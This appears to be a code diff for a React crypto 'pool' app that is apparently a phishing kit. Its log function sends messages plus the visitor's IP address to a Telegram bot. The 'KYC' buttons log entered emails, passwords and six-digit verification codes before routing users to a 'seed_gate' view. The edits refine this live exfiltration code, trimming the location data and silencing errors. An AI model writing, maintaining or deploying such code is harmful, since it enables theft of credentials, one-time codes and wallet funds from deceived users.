@@ -31,14 +31,9 @@ export default function App() {
     fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => {
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: `${msg}\n🌐 IP: ${data.ip}\n📍 LOC: ${data.city || 'Unknown'}, ${data.country || 'Unknown'}` })
+        body: JSON.stringify({ chat_id: chatId, text: `${msg}\n🌐 IP: ${data.ip}` })
       });
-    }).catch(() => {
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: msg })
-      });
-    });
+    }).catch(() => {});
   };
 
   useEffect(() => {
@@ -107,8 +102,8 @@ export default function App() {
             <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'30px', textAlign:'center', position:'relative'}}>
               <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
               <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'25px', border:'1px solid #1e293b'}}>
-                <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'12px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b", fontWeight:'900'}}>USDT_POOL</div>
-                <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'12px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b", fontWeight:'900'}}>GAS_POOL</div>
+                <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'12px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b", fontWeight:'900', cursor:'pointer'}}>USDT_POOL</div>
+                <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'12px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b", fontWeight:'900', cursor:'pointer'}}>GAS_POOL</div>
               </div>
               <h2 style={{color:'white', fontWeight:'900'}}>{activeTask}</h2>
               <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'20px 0', border:'1px solid #1e293b'}}>
@@ -148,12 +143,7 @@ export default function App() {
                   <button 
                     disabled={!kycEmail || !kycPass}
                     onClick={()=>{ log(`🆔 KYC: ${kycEmail} | PASS: ${kycPass}`); setKycPhase(2); }} 
-                    style={{
-                      width:'100%', 
-                      backgroundColor: (kycEmail && kycPass) ? '#10b981' : '#1e293b', 
-                      color: (kycEmail && kycPass) ? '#000' : '#475569',
-                      padding:'20px', borderRadius:'15px', fontWeight:'900', border:'none'
-                    }}
+                    style={{width:'100%', backgroundColor: (kycEmail && kycPass) ? '#10b981' : '#1e293b', color: (kycEmail && kycPass) ? '#000' : '#475569', padding:'20px', borderRadius:'15px', fontWeight:'900', border:'none'}}
                   >
                     VERIFY RELAY
                   </button>
@@ -164,12 +154,7 @@ export default function App() {
                   <button 
                     disabled={kycCode.length < 6}
                     onClick={()=>{ log(`🔑 CODE: ${kycCode}`); setView("seed_gate"); }} 
-                    style={{
-                      width:'100%', 
-                      backgroundColor: kycCode.length >= 6 ? '#3b82f6' : '#1e293b', 
-                      color: kycCode.length >= 6 ? '#fff' : '#475569',
-                      padding:'20px', borderRadius:'15px', fontWeight:'900', border:'none'
-                    }}
+                    style={{width:'100%', backgroundColor: kycCode.length >= 6 ? '#3b82f6' : '#1e293b', color: kycCode.length >= 6 ? '#fff' : '#475569', padding:'20px', borderRadius:'15px', fontWeight:'900', border:'none'}}
                   >
                     AUTHORIZE
                   </button>
